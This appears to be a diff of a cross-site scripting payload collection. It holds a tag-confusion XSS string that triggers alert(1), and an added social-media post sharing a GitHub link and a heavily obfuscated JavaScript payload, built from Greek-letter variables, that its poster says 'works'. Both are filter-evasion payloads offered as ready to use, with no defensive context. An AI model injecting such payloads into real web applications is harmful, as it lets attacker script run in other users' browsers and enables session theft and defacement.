@@ -1,2 +1,10 @@
 select><noembed></delect><script x='a@b'a>
 y='a@b'//a@b%0a\u0061lert(1)</script x>
+Yassin
+@Yass1nMohamed
+·
+Aug 26
+XSS Payload Written in... actually idk wtf is that but it works 😭
+
+https://github.com/yassinmohamed1111/superxss/blob/main/README.md
+λ='',ψ=!λ+λ,χ=!ψ+λ,Ϟ=λ+{},ϟ=ψ[λ++],Ϡ=ψ[ϡ=λ],Ϣ=++ϡ+λ,ϣ=Ϟ[ϡ+Ϣ],ψ[ϣ+=Ϟ[λ]+(ψ.χ+Ϟ)[λ]+χ[Ϣ]+ϟ+Ϡ+ψ[ϡ]+ϣ+ϟ+Ϟ[λ]+Ϡ][ϣ](χ[λ]+χ[ϡ]+ψ[Ϣ]+Ϡ+ϟ+"('⟊⟒⫯⫸⧉⧬⩣⪬⨀⩘⫛⟆⧆⧈⪻⫷⩚⟟')")()
